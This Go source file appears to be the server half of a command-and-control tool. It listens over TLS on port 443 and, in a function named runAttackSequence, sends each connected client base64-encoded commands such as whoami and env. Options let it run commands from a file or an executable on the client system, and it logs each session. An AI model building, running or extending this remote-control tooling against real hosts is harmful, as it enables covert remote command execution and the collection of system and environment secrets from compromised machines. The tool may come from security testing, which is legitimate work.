package main

import (
	"bufio"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"

	// "errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

func handleError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

//file upl/downl functions, if needed
func uploadFile(conn *tls.Conn, path string) {
	// open file to upload
	fi, err := os.Open(path)
	handleError(err)
	defer fi.Close()
	// upload
	_, err = io.Copy(conn, fi)
	handleError(err)
}

func downloadFile(conn *tls.Conn, path string) {
	// create new file to hold response
	fo, err := os.Create(path)
	handleError(err)
	defer fo.Close()

	handleError(err)
	defer conn.Close()

	_, err = io.Copy(fo, conn)
	handleError(err)
}

func main() {
	var cmdsToRun = []string{"ls", "uname ", " whoami", "pwd      ", "env"}
	arguments := os.Args
	checkFlags(arguments, len(arguments), cmdsToRun)
	var PORT string
	PORT = "443"

	cert, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")
	if err != nil {
		log.Fatalf("server: loadkeys: %s", err)
	}
	config := tls.Config{Certificates: []tls.Certificate{cert}}
	config.Rand = rand.Reader
	service := "0.0.0.0:" + PORT

	listener, err := tls.Listen("tcp", service, &config)
	if err != nil {
		log.Fatalf("Server Listen: %s", err)
	}
	fmt.Println("Server Listening on port: ", PORT)
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Client accept error: %s", err)
			break
		}

		defer conn.Close()
		log.Printf("Client accepted: %s", conn.RemoteAddr())
		tlscon, ok := conn.(*tls.Conn)
		if ok {
			log.Print("ok=true")
			state := tlscon.ConnectionState()
			for _, v := range state.PeerCertificates {
				log.Print(x509.MarshalPKIXPublicKey(v.PublicKey))
			}
		}
		go handleClient(conn, listener, cmdsToRun)
	}
}

func genCert(email string) string {
	cmd, err := exec.Command("/bin/sh", "../certGen.sh", email).Output()
	if err != nil {
		fmt.Printf("Error generating SSL Certificate: %s", err)
	}
	outstr := string(cmd)
	return outstr
}

func readFile(filePathName string) ([]string, int) {
	file, err := os.Open(filePathName)
	if err != nil {
		log.Fatalf("Failed to open file.")
	}
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var text []string

	for scanner.Scan() {
		text = append(text, scanner.Text())
	}
	file.Close()
	return text, len(text)

}
func handleClient(conn net.Conn, l net.Listener, cmdsToRun []string) {
	file, err := os.OpenFile(conn.RemoteAddr().String()+"-"+time.Now().Format(time.RFC1123)+".log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	file.Close()
	logger := log.New(file, "Client Log\n"+conn.RemoteAddr().String()+time.Now().String(), log.LstdFlags)
	runAttackSequence(conn, logger, cmdsToRun)
	disconnectClient(conn, logger, *file)
}

func checkFlags(arguments []string, l int, cmdsToRun []string) bool {
	switch arguments[1] {
	case "-a": //run sample commands -> echo $ARAALI_COUNT", "uname -a", "whoami", "pwd", "env"
		return false
	case "-fe": //run commands from file
		if l != 3 {
			fmt.Println("No filename specified.")
			os.Exit(1)
		}
		//check if filepath exists
		if _, err := os.Stat("sample.txt"); err == nil {
			fmt.Printf("File exists\n")
		} else {
			fmt.Printf("File does not exist\n")
			os.Exit(1)
		}
		cmdsToRun, _ = readFile(arguments[2])
		break
	case "-fue":
		if l != 3 {
			fmt.Println("No filename specified.")
			os.Exit(1)
		}
		//check if filepath exists
		if _, err := os.Stat("sample.txt"); err != nil {
			fmt.Printf("Filepath does not exist\n")
			os.Exit(1)
		}
		return true
	default:
		fmt.Printf("'%s' is not a listed command, please choose from the following: \n", arguments[1])
		fmt.Println("-a : Run \"echo $ARAALI_COUNT\", \"uname -a\", \"whoami\", \"pwd\", \"env\"")
		fmt.Println("-fe : Run commands from a file specified as argument 3")
		fmt.Println("-fue : Run an executable file on the client system, specified as argument 3")
		os.Exit(1)
	}
	return false

}

func runAttackSequence(conn net.Conn, logger *log.Logger, cmdsToRun []string) {
	logger.Println("FILE BEGINS HERE.")

	for _, element := range cmdsToRun {
		encodedStr := base64.StdEncoding.EncodeToString([]byte(element))
		logger.Println("EXECUTE: " + " " + element)
		_, err := conn.Write([]byte(strings.TrimSpace(encodedStr)))
		handleError(err)
		time.Sleep(time.Second)
	}
	logger.Println("\nDONE.\nFILE ENDS HERE.")
}

func disconnectClient(conn net.Conn, logger *log.Logger, file os.File) {
	logger.Println("Disconnecting Client: ", strings.Split(conn.RemoteAddr().String(), ":")[0])
	file.Close()
	conn.Close()
}
